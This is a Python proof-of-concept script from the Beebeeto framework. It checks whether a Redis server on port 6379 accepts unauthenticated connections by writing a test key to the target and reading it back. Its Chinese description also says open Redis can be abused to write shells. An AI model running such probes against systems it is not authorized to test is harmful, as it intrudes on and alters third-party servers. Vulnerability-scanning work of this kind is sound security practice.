#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import redis
import string

from baseframe import BaseFrame
from utils.http.http import transform_target_ip


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0128',
            'name': 'Redis 未授权访问漏洞 POC',
            'author': 'stefan',
            'create_date': '2015-08-07',
        },
        # 协议相关信息
        'protocol': {
            'name': 'Redis',
            'port': [6379],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Redis',
            'vul_version': ['*'],
            'type': 'Other',
            'tag': ['Redis远程连接可写shell漏洞', '默认空口令未授权访问漏洞', '6379端口'],
            'desc': '''
                    Redis默认安装后无需口令可远程连接，并且可以使用redis命令更改写入文件的目录及类型，
                    从而导致一系列安全问题。
                    ''',
            'references': ['http://www.secpulse.com/archives/5357.html',
                           ],
        },
    }

    def _init_user_parser(self):
        self.user_parser.add_option('-p','--port',
                                action='store', dest='port', type='int', default=6379,
                                help='this poc need the port to connect redis'
                                'the default port is 6379.')
    @classmethod
    def verify(cls, args):
        ip_addr = transform_target_ip(args['options']['target'])
        p = args['options']['port']
        if args['options']['verbose']:
            print '[*] Connect Redis: redis-cli -h ' + ip_addr + ' -p' + str(p)
        try:
            r = redis.Redis(host=ip_addr, port=p, db=0)
            ret1 = r.set('name','stefan')
            ret2 = r.get('name')
            if ret1 & (ret2 in 'stefan'):
                args['success'] = True
                args['poc_ret']['vul_url'] = ip_addr + ':' + str(p)
        except Exception, e:
            if args['options']['verbose']:
                print str(e)
            args['success'] = False
            return args
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())